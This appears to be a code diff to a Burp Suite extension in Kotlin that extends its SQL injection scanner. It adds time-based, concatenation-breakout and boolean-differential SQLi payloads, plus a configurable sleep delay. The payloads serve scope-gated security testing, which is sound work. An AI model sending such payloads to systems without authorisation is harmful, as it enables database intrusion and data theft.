@@ -4,6 +4,7 @@ import burp.api.montoya.MontoyaApi
 import io.bitbytelab.raijin.safety.BoundedHttp
 import burp.api.montoya.http.HttpService
 import burp.api.montoya.http.message.requests.HttpRequest
+import io.bitbytelab.raijin.core.TextSimilarity
 import io.bitbytelab.raijin.injection.InjectionOracle
 import io.bitbytelab.raijin.safety.RequestHygiene
 import io.bitbytelab.raijin.safety.ScopeGate
@@ -45,7 +46,12 @@ class InjectionBridge(private val api: MontoyaApi) {
         put("payload", payload)
     }
 
-    fun probe(request: String, host: String, port: Int, useTls: Boolean, classes: List<String>?): JsonObject {
+    /**
+     * @param delaySeconds Sleep duration for time-based SQLi payloads (default 5). Raise this
+     *   for a target with network jitter, a lab that only counts a longer sleep as solved, or
+     *   a WAF that clamps/rate-limits short sleeps.
+     */
+    fun probe(request: String, host: String, port: Int, useTls: Boolean, classes: List<String>?, delaySeconds: Int = 5): JsonObject {
         scopeGate.deny((if (useTls) "https" else "http") + "://$host:$port/")?.let { return it }
         return try {
             val service = HttpService.httpService(host, port, useTls)
@@ -67,10 +73,47 @@ class InjectionBridge(private val api: MontoyaApi) {
                             val dbms = InjectionOracle.sqlError(r.body)
                             if (dbms != null) { findings.add(finding("sqli", "error-based", "SQL error signature (DBMS=$dbms) via payload $p", p)); break }
                         }
-                        for (p in listOf("' AND SLEEP(5)-- -", "1) AND SLEEP(5)-- -", "';WAITFOR DELAY '0:0:5'-- -", "' AND pg_sleep(5)-- -")) {
+                        // Comment-truncation shapes (assume the value terminates a clause) AND
+                        // concatenation-breakout shapes (assume the value sits BETWEEN two string
+                        // literals, e.g. a cookie used as `... WHERE col = 'x' || :value || 'y'`)
+                        // — a payload shaped for one context never reaches the sleep call in the
+                        // other, so both are tried.
+                        val timingPayloads = listOf(
+                            "' AND SLEEP($delaySeconds)-- -", "1) AND SLEEP($delaySeconds)-- -",
+                            "';WAITFOR DELAY '0:0:$delaySeconds'-- -", "' AND pg_sleep($delaySeconds)-- -",
+                            "x'||pg_sleep($delaySeconds)||'", "'||pg_sleep($delaySeconds)||'",
+                            "x' AND SLEEP($delaySeconds) AND 'x'='x", "x';WAITFOR DELAY '0:0:$delaySeconds'--",
+                            "'||(SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',$delaySeconds) ELSE 1 END FROM dual)||'"
+                        )
+                        for (p in timingPayloads) {
                             val r = send(service, base.replace("FUZZ", p)); probesSent++
-                            if (InjectionOracle.timeDelayed(baseline.elapsedMs, r.elapsedMs, 5)) {
-                                findings.add(finding("sqli", "time-based", "response delayed ~5s via $p (baseline ${baseline.elapsedMs}ms, probe ${r.elapsedMs}ms)", p)); break
+                            if (InjectionOracle.timeDelayed(baseline.elapsedMs, r.elapsedMs, delaySeconds)) {
+                                findings.add(finding("sqli", "time-based", "response delayed ~${delaySeconds}s via $p (baseline ${baseline.elapsedMs}ms, probe ${r.elapsedMs}ms)", p)); break
+                            }
+                        }
+                        // Boolean-differential: confirms blind SQLi when error text is suppressed
+                        // and no timing payload lands (clamped sleep, rate limit, wrong insertion
+                        // shape) — the only one of the four oracles that needs neither an error
+                        // string nor an observable delay to work.
+                        val boolPairs = listOf(
+                            "' AND '1'='1" to "' AND '1'='2",
+                            "' OR '1'='1" to "' OR '1'='2",
+                            "x' AND '1'='1" to "x' AND '1'='2",
+                            "'||('1'='1)||'" to "'||('1'='2)||'"
+                        )
+                        for ((truePayload, falsePayload) in boolPairs) {
+                            val trueR = send(service, base.replace("FUZZ", truePayload)); probesSent++
+                            val falseR = send(service, base.replace("FUZZ", falsePayload)); probesSent++
+                            if (InjectionOracle.booleanDifferential(baseline.body, trueR.body, falseR.body, TextSimilarity::dice)) {
+                                findings.add(
+                                    finding(
+                                        "sqli", "boolean-differential",
+                                        "response diverges between TRUE ($truePayload) and FALSE ($falsePayload) conditions " +
+                                            "— one matches the baseline, the other does not",
+                                        "$truePayload | $falsePayload"
+                                    )
+                                )
+                                break
                             }
                         }
                     }
@@ -95,10 +138,16 @@ class InjectionBridge(private val api: MontoyaApi) {
             buildJsonObject {
                 put("target", "${if (useTls) "https" else "http"}://$host:$port")
                 put("classes_tested", buildJsonArray { active.forEach { add(it) } })
+                put("delay_seconds", delaySeconds)
                 put("probes_sent", probesSent)
                 put("confirmed_count", findings.size)
                 put("findings", buildJsonArray { findings.forEach { add(it) } })
-                put("note", "Confirmed via deterministic oracles (SQL errors, template math-eval, file markers, time delay). For blind/OOB (SSRF, blind cmdi) pair collaborator_* with http_fuzz.")
+                put(
+                    "note",
+                    "Confirmed via deterministic oracles (SQL errors, template math-eval, file markers, time delay, " +
+                        "boolean-differential). FUZZ works anywhere in the raw request, including inside a header line " +
+                        "such as 'Cookie: TrackingId=FUZZ'. For blind/OOB (SSRF, blind cmdi) pair collaborator_* with http_fuzz."
+                )
             }
         } catch (e: Exception) {
             buildJsonObject { put("error", "Injection probe failed: ${e.message}") }
